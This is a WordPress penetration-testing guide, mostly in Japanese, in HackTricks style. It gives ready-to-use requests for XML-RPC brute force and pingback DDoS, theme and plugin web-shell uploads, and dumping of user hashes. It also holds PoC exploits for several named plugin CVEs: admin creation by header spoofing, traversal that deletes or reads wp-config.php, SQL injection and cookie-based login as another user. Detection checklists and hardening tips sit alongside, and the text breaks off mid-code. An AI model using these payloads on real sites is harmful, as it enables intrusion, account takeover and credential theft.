# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## 基本情報

- **Uploaded** ファイルは次の場所に保存されます: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** そのためテーマの php を変更して RCE を得たい場合、おそらくこのパスを使用します。例えば、**theme twentytwelve** を使用すると、次の場所の **404.php** ファイルに **アクセス** できます: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- `wp-config.php` にはデータベースのルートパスワードが含まれていることがあります。
- チェックすべきデフォルトのログインパス: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **主な WordPress ファイル**

- `index.php`
- `license.txt` にはインストールされている WordPress のバージョンなど、有用な情報が含まれます。
- `wp-activate.php` は新しい WordPress サイトをセットアップする際のメール有効化プロセスに使用されます。
- ログインフォルダ（隠すために名前が変更されている場合があります）:
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` は、HTTP をトランスポート機構、XML をエンコーディング機構としてデータを送受信できる WordPress の機能を表すファイルです。この種の通信は WordPress の [REST API](https://developer.wordpress.org/rest-api/reference) に置き換えられています。
- `wp-content` フォルダはプラグインやテーマが格納される主要なディレクトリです。
- `wp-content/uploads/` はプラットフォームにアップロードされたファイルが保存されるディレクトリです。
- `wp-includes/` は証明書、フォント、JavaScript ファイル、ウィジェットなどのコアファイルが格納されるディレクトリです。
- `wp-sitemap.xml` WordPress 5.5 以降では、公開投稿や公開でクエリ可能な投稿タイプやタクソノミーを含む sitemap XML ファイルが生成されます。

**Post exploitation**

- `wp-config.php` ファイルには、WordPress がデータベースに接続するために必要なデータベース名、データベースホスト、ユーザー名とパスワード、認証キーおよびソルト、データベーステーブルのプレフィックスなどの情報が含まれます。この設定ファイルは DEBUG モードを有効にするためにも使用でき、トラブルシューティング時に役立ちます。

### ユーザー権限

- **Administrator**
- **Editor**: 自分および他者の投稿を公開・管理できます
- **Author**: 自分の投稿を公開・管理できます
- **Contributor**: 投稿を書き管理できますが、公開することはできません
- **Subscriber**: 投稿を閲覧し、自分のプロフィールを編集できます

## **Passive Enumeration**

### **Get WordPress version**

`/license.txt` または `/readme.html` ファイルが存在するか確認してください。

ページの **ソースコード** 内に（例: [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)）:

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS リンクファイル

![](<../../images/image (533).png>)

- JavaScript ファイル

![](<../../images/image (524).png>)

### プラグインを取得
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### テーマを取得
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### 一般的なバージョンの抽出
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Active enumeration

### Plugins and Themes

おそらくすべての Plugins and Themes を見つけることはできません。すべてを発見するには、**actively Brute Force a list of Plugins and Themes** を実行する必要があります（幸い、自動化ツールにこれらのリストが含まれている場合があります）。

### Users

- **ID Brute:** Brute Forcing により WordPress サイトの有効な users IDs を取得します:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
レスポンスが **200** または **30X** の場合、その id は **有効** です。レスポンスが **400** の場合、その id は **無効** です。

- **wp-json:** ユーザーの情報を取得するためにクエリを投げてみてください:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
ユーザーに関する情報を明らかにする別の `/wp-json/` エンドポイントは次のとおりです:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **このエンドポイントは投稿を行ったユーザーのみを公開する点に注意してください。** **Only information about the users that has this feature enable will be provided**。

Also note that **/wp-json/wp/v2/pages** could leak IP addresses.
また、**/wp-json/wp/v2/pages** が IP アドレスを leak する可能性がある点にも注意してください。

- **Login username enumeration**: When login in **`/wp-login.php`** the **message** is **different** is the indicated **username exists or not**.
- **Login username enumeration**: **`/wp-login.php`** にログインする際、表示される **メッセージ** が **ユーザー名の存在有無で異なる**。

### XML-RPC

If `xml-rpc.php` is active you can perform a credentials brute-force or use it to launch DoS attacks to other resources. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).
もし `xml-rpc.php` が有効であれば、credentials brute-force を実行したり、他のリソースに対して DoS を仕掛けるために利用したりできます。(例えば、このプロセスは [using this](https://github.com/relarizky/wpxploit) を使って自動化できます)。

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:
有効か確認するには _**/xmlrpc.php**_ にアクセスして、次のリクエストを送ってください:

**Check**
**確認**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** または **`metaWeblog.getUsersBlogs`** は、brute-force credentials に使用できるメソッドのいくつかです。これらのいずれかを見つけた場合、次のようなものを送信できます:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
認証情報が有効でない場合、200コードのレスポンス内にある_"Incorrect username or password"_というメッセージが表示されるはずです。

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

正しい認証情報を使用すると、ファイルをアップロードできます。レスポンスにはパスが表示されます ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
また、同じリクエストで複数の資格情報を試せるので、**より速い方法**での brute-force に **`system.multicall`** を使用できます:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

このメソッドはプログラム向けで人間向けではなく古いため、2FA をサポートしていません。したがって、有効な creds を持っているがメインの入口が 2FA によって保護されている場合、**xmlrpc.php を悪用してその creds で 2FA をバイパスしてログインできる可能性があります**。コンソールから行えるすべての操作ができるわけではない点に注意してくださいが、Ippsec が [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) で説明しているように RCE に到達できる場合があります。

**DDoS or port scanning**

リスト内に _**pingback.ping**_ が見つかれば、Wordpress に任意のホスト/ポートへリクエストを送らせることができます。\
これを利用して、**数千**の Wordpress **サイト**に一つの **場所** へ **アクセス** させ（その場所で **DDoS** が発生します）、あるいは Wordpress に内部 **ネットワーク** を **スキャン** させることもできます（任意のポートを指定可能です）。
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

**faultCode** の値が **0**（17）より **大きい** 場合、そのポートは開いていることを意味します。

前のセクションでの **`system.multicall`** の使用例を確認し、このメソッドを悪用してDDoSを引き起こす方法を学んでください。

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

このファイルは通常 Wordpress サイトのルートに存在します: **`/wp-cron.php`**\
このファイルに**アクセス**されると、**重い** MySQL **query** が実行されるため、**attackers** によって **DoS** を **引き起こす** のに利用される可能性があります。\
また、デフォルトでは `wp-cron.php` は各ページロード時（クライアントが Wordpress の任意のページを要求するたび）に呼び出されるため、トラフィックの多いサイトでは問題（DoS）を引き起こす可能性があります。

Wp-Cron を無効化し、ホスト内で定期的に必要な処理を行う real cronjob を作成することを推奨します（問題を引き起こさないように）。

### /wp-json/oembed/1.0/proxy - SSRF

Try to access _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ and the Worpress site may make a request to you.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

このツールは **methodName: pingback.ping** とパス **/wp-json/oembed/1.0/proxy** が存在するかをチェックし、存在する場合はそれらを利用しようとします。

## 自動ツール
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## ビットを上書きしてアクセスを得る

実際の攻撃というより好奇心的な話です。CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) では任意の wordpress ファイルの1ビットを反転させることができました。例えばファイル `/var/www/html/wp-includes/user.php` の位置 `5389` のビットを反転させ、NOT (`!`) 演算を NOP 化することができます。
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **パネル RCE**

**テーマで使用されている php を変更する（管理者の認証情報が必要）**

外観 → テーマエディター → 404 テンプレート（右側）

php シェルの内容に変更する:

![](<../../images/image (384).png>)

更新したページにどうアクセスするかをインターネットで調べてください。この場合、ここにアクセスします: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

使用できるもの:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
セッションを取得するため。

## Plugin RCE

### PHP plugin

It may be possible to upload .php files as a plugin.\
例えば次のようにphp backdoorを作成します:

![](<../../images/image (183).png>)

次に新しいプラグインを追加します:

![](<../../images/image (722).png>)

プラグインをアップロードしてInstall Nowを押します:

![](<../../images/image (249).png>)

「Procced」をクリック:

![](<../../images/image (70).png>)

おそらく見た目には何も起きないことが多いですが、Mediaに移動するとアップロードされたshellが表示されます:

![](<../../images/image (462).png>)

それを開くと、reverse shellを実行するためのURLが表示されます:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

この方法は、脆弱であることが知られている悪意あるプラグインのインストールを伴い、web shellを取得するために悪用できます。このプロセスはWordPressのダッシュボードから次のように実行されます:

1. **Plugin Acquisition**: The plugin is obtained from a source like Exploit DB like [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- WordPressのダッシュボードで `Dashboard > Plugins > Upload Plugin` に移動します。
- ダウンロードしたプラグインのzipファイルをアップロードします。
3. **Plugin Activation**: プラグインが正常にインストールされたら、ダッシュボードから有効化します。
4. **Exploitation**:
- プラグイン "reflex-gallery" がインストール・有効化されていると、既知の脆弱性を悪用できます。
- Metasploit framework はこの脆弱性用のexploitを提供します。適切なモジュールを読み込み、特定のコマンドを実行することで、meterpreterセッションを確立し、サイトへの不正アクセスが可能になります。
- これはWordPressサイトを悪用する多数の方法のうちの一つに過ぎないことに注意してください。

コンテンツにはプラグインのインストールと有効化手順を示す視覚的な補助が含まれています。ただし、適切な許可なしにこのような方法で脆弱性を悪用することは違法であり非倫理的である点に注意してください。この情報は責任を持って、明確な許可のある penetration testing のような合法的な文脈でのみ使用してください。

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ は WordPress の **Cross-Site Scripting (XSS)** 脆弱性を **Remote Code Execution (RCE)** やその他の重大な脆弱性へエスカレーションするためのスクリプトです。詳しくは [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html) を参照してください。**Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:** をサポートし、次のことを可能にします:
- _**Privilege Escalation:**_ WordPress にユーザーを作成します。
- _**(RCE) Custom Plugin (backdoor) Upload:**_ カスタムプラグイン（backdoor）を WordPress にアップロードします。
- _**(RCE) Built-In Plugin Edit:**_ WordPress の組み込みプラグインを編集します。
- _**(RCE) Built-In Theme Edit:**_ WordPress の組み込みテーマを編集します。
- _**(Custom) Custom Exploits:**_ サードパーティの WordPress プラグイン/テーマ向けのカスタムエクスプロイトを提供します。

## Post Exploitation

ユーザー名とパスワードの抽出:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
管理者のパスワードを変更する:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Attack Surface

Wordpress plugin がどのように機能を公開するかを把握することは、その機能の脆弱性を発見する上で重要です。プラグインが機能を公開する方法は以下の箇条書きに示してあり、脆弱なプラグインの例は [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/) を参照してください。

- **`wp_ajax`**

プラグインが機能を公開する方法のひとつが AJAX handlers 経由です。これらはロジックや認可、認証のバグを含む可能性があります。さらに、これらの関数が認証と認可の両方を wordpress nonce の存在に依存しているケースはかなり頻繁に見られます。その nonce は **Wordpress インスタンスに認証された任意のユーザーが持っている可能性がある**（役割に依らず）ためです。

これらはプラグイン内の関数を公開するために使用される関数です：
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv` の使用はエンドポイントを任意のユーザー（未認証のユーザーを含む）からアクセス可能にします。**

> [!CAUTION]
> さらに、関数が `wp_verify_nonce` でユーザーの認可のみをチェックしている場合、この関数は単にユーザーがログインしているかどうかを確認しているだけで、通常はユーザーのロールをチェックしません。そのため、権限の低いユーザーが高い権限を要する操作にアクセスできる可能性があります。

- **REST API**

wordpress から関数を公開するには、`register_rest_route` 関数を使って rest AP を登録することも可能です：
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` は、特定のユーザーが API メソッドを呼び出す権限があるかをチェックするコールバック関数です。

**組み込みの `__return_true` 関数が使われている場合、ユーザー権限のチェックを単純にスキップします。**

- **php ファイルへの直接アクセス**

もちろん、Wordpress は PHP を使用しており、プラグイン内のファイルはウェブから直接アクセス可能です。したがって、プラグインがファイルへアクセスするだけで発動する脆弱な機能を公開している場合、任意のユーザーによって悪用され得ます。

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

一部のプラグインは、内部統合やリバースプロキシ向けに「trusted header」のショートカットを実装し、そのヘッダーを REST リクエストの現在のユーザーコンテキスト設定に利用します。もしそのヘッダーが上流コンポーネントで暗号的にリクエストに結び付けられていなければ、攻撃者はそれを偽装して管理者として特権のある REST ルートにアクセスできます。

- 影響: core users REST ルート経由で新しい管理者を作成することで、未認証から管理者への権限昇格が可能になる。
- Example header: `X-Wcpay-Platform-Checkout-User: 1`（ユーザー ID 1 を強制、通常は最初の管理者アカウント）。
- Exploited route: `POST /wp-json/wp/v2/users` に昇格された role 配列を送信する。

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Why it works
- プラグインがクライアント制御のヘッダを認証状態にマップし、権限チェックをスキップする。
- WordPress core はこのルートに対して `create_users` 権限を期待する；プラグインのハックはヘッダから直接 current user context を設定することでこれを回避する。

Expected success indicators
- 作成されたユーザーを記述する JSON ボディと共に返る HTTP 201。
- `wp-admin/users.php` に表示される新しい admin ユーザー。

Detection checklist
- ユーザコンテキストを設定するためにカスタムヘッダを読む `getallheaders()`, `$_SERVER['HTTP_...']`、またはベンダー SDK を grep する（例: `wp_set_current_user()`, `wp_set_auth_cookie()`）。
- 堅牢な `permission_callback` チェックを欠き、代わりにリクエストヘッダに依存している特権コールバックの REST 登録をレビューする。
- REST ハンドラ内でヘッダ値だけでガードされているコアのユーザー管理関数（`wp_insert_user`, `wp_create_user`）の使用を探す。

### wp_ajax_nopriv を介した認証されていない任意のファイル削除 (Litho Theme <= 3.0)

WordPress の themes や plugins は `wp_ajax_` と `wp_ajax_nopriv_` フックを通じて AJAX ハンドラを公開することが多い。**_nopriv_** バリアントが使われると**コールバックは認証されていない訪問者から到達可能になる**ため、機密性の高いアクションは追加で以下を実装する必要がある:

1. **権限チェック**（例: `current_user_can()` または少なくとも `is_user_logged_in()`）、および
2. **CSRF nonce** を `check_ajax_referer()` / `wp_verify_nonce()` で検証すること、および
3. **厳格な入力のサニタイズ / 検証**。

Litho multipurpose theme (< 3.1) は *Remove Font Family* 機能でこれら3つの制御を忘れており、結果として次のコード（簡略化）を出荷していた:
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Issues introduced by this snippet:

* **認証なしアクセス** – `wp_ajax_nopriv_` フックが登録されている。
* **nonce / capability チェック無し** – 任意の訪問者がエンドポイントにアクセスできる。
* **パスのサニタイズ無し** – ユーザー制御の `fontfamily` 文字列がフィルタリングなしでファイルシステムパスに連結され、古典的な `../../` トラバーサルを許す。

#### 悪用

攻撃者は単一の HTTP POST リクエストを送ることで、**uploads base directory 以下**（通常は `<wp-root>/wp-content/uploads/`）にある任意のファイルやディレクトリを削除できる：
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### Detection checklist

* Any `add_action( 'wp_ajax_nopriv_...')` callback that calls filesystem helpers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Concatenation of unsanitised user input into paths (look for `$_POST`, `$_GET`, `$_REQUEST`).
* Absence of `check_ajax_referer()` and `current_user_can()`/`is_user_logged_in()`.

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

多くのプラグインは、オリジナルのロールを user meta に保存して後で復元できるようにする "view as role" や一時的なロール切替機能を実装している。復元処理がリクエストパラメータ（例：`$_REQUEST['reset-for']`）とプラグイン管理のリストのみを頼りにし、capability チェックや有効な nonce を行わない場合、これは vertical privilege escalation になる。

実例は Admin and Site Enhancements (ASE) プラグイン（≤ 7.6.2.1）で発見された。リセット処理は、ユーザ名が内部配列 `$options['viewing_admin_as_role_are']` に存在する場合に `reset-for=<username>` に基づいてロールを復元していたが、現在のロールを削除して user meta `_asenha_view_admin_as_original_roles` から保存されたロールを再追加する前に `current_user_can()` チェックも nonce 検証も行っていなかった：
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
なぜ悪用可能か

- サーバー側の認可なしに `$_REQUEST['reset-for']` とプラグインオプションを信頼している。
- ユーザーが以前により高い権限を `_asenha_view_admin_as_original_roles` に保存されており、その後権限が下げられていた場合、reset path にアクセスすることでその権限を復元できる。
- 一部の環境では、認証済みの任意のユーザーが `viewing_admin_as_role_are` にまだ残っている別のユーザー名のリセットをトリガーできる（認可の不備）。

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
On vulnerable builds this removes current roles and re-adds the saved original roles (e.g., `administrator`), effectively escalating privileges.

Detection checklist

- Look for role-switching features that persist “original roles” in user meta (e.g., `_asenha_view_admin_as_original_roles`).
- Identify reset/restore paths that:
- Read usernames from `$_REQUEST` / `$_GET` / `$_POST`.
- Modify roles via `add_role()` / `remove_role()` without `current_user_can()` and `wp_verify_nonce()` / `check_admin_referer()`.
- Authorize based on a plugin option array (e.g., `viewing_admin_as_role_are`) instead of the actor’s capabilities.

---

### Unauthenticated privilege escalation via cookie‑trusted user switching on public init (Service Finder “sf-booking”)

一部のプラグインは user-switching ヘルパーを public の `init` フックに結び付け、クライアント制御の cookie から識別を導出します。コードが認証、capability、および有効な nonce を検証せずに `wp_set_auth_cookie()` を呼び出すと、未認証の訪問者が任意のユーザー ID として強制ログインさせることができます。

Typical vulnerable pattern (simplified from Service Finder Bookings ≤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // 🔥 sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
なぜ悪用可能か

- 公開された `init` フックによりハンドラは unauthenticated users に到達可能（`is_user_logged_in()` ガードがない）。
- 識別はクライアントで変更可能な cookie (`original_user_id`) から導出されている。
- `wp_set_auth_cookie($uid)` を直接呼び出すことで、リクエスタをそのユーザとしてログインさせる — capability/nonce checks が行われない。

Exploitation (unauthenticated)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF に関する WordPress/plugin CVEs の考慮事項

汎用の edge/server WAF は、広範なパターン（SQLi、XSS、LFI）向けにチューニングされています。多くの高インパクトな WordPress/plugin の脆弱性は、アプリケーション固有のロジックや認可（auth）のバグであり、エンジンが WordPress のルートや plugin のセマンティクスを理解していない限り、通常のトラフィックに見えることがあります。

Offensive notes

- クリーンなペイロードで plugin 固有のエンドポイントを標的にする: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- まずは認証不要の経路を試す（AJAX `nopriv`, REST で permissive な `permission_callback`, public shortcodes）。デフォルトのペイロードは難読化なしで成功することが多い。
- 典型的な高インパクトのケース：権限昇格（broken access control）、任意ファイルのアップロード/ダウンロード、LFI、open redirect。

Defensive notes

- plugin CVEs を保護するために汎用 WAF シグネチャに依存しないこと。アプリケーション層で脆弱性固有の仮想パッチを導入するか、迅速に更新する。
- コード内では、ネガティブな regex フィルタよりも、ポジティブセキュリティチェック（capabilities、nonces、厳格な入力検証）を優先する。

## WordPress Protection

### Regular Updates

WordPress、plugins、themes が最新であることを確認してください。また wp-config.php で自動更新が有効になっていることを確認してください：
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
また、**信頼できる WordPress プラグインとテーマのみをインストールしてください**。

### セキュリティプラグイン

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **その他の推奨事項**

- デフォルトの **admin** ユーザーを削除する
- **強力なパスワード** と **2FA** を使用する
- 定期的にユーザーの**レビュー**および**権限**を確認する
- **ログイン試行回数を制限する**ことで Brute Force 攻撃を防ぐ
- **`wp-admin.php`** ファイル名を変更し、内部または特定のIPアドレスからのみアクセスを許可する。

### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

WP Job Portal 採用プラグインは **savecategory** タスクを公開しており、結果的に `modules/category/model.php::validateFormData()` 内で以下の脆弱なコードを実行していた：
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
このスニペットによって導入された問題:

1. **サニタイズされていないユーザー入力** – `parentid` は HTTP リクエストからそのまま取得されています。
2. **WHERE句内での文字列連結** – `is_numeric()` / `esc_sql()` / プリペアドステートメント が使われていません。
3. **認証不要で到達可能** – アクションは `admin-post.php` を通じて実行されますが、唯一のチェックは **CSRF nonce**（`wp_verify_nonce()`）だけで、任意の訪問者がショートコード `[wpjobportal_my_resumes]` を埋め込んだ公開ページから取得できます。

#### 悪用

1. 新しい nonce を取得:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid` を悪用して任意の SQL を注入:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
レスポンスは注入したクエリの結果を開示するか、データベースを変更し、SQLi の存在を証明します。


### 認証不要の任意ファイルダウンロード / パストラバーサル (WP Job Portal <= 2.3.2)

別のタスクである **downloadcustomfile** により、訪問者はパストラバーサルを使ってディスク上の **任意のファイル** をダウンロードできました。脆弱なシンクは `modules/customfield/model.php::downloadCustomUploadedFile()` にあります：
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` は攻撃者により制御され、**サニタイズされていない**状態で連結されます。再度、唯一のゲートは **CSRF nonce** で、resume ページから取得できます。

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
サーバーは `wp-config.php` の内容を返し、leaking DB credentials and auth keys。

## 未認証アカウントの乗っ取り via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

多くのテーマ/プラグインは admin-ajax.php 経由で公開される "social login" ヘルパーを同梱しています。未認証の AJAX アクション (wp_ajax_nopriv_...) が、provider data がない場合にクライアント提供の識別子を信用してから wp_set_auth_cookie() を呼び出すと、これは完全な認証バイパスになります。

Typical flawed pattern (simplified)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider – execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // 🔥 logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
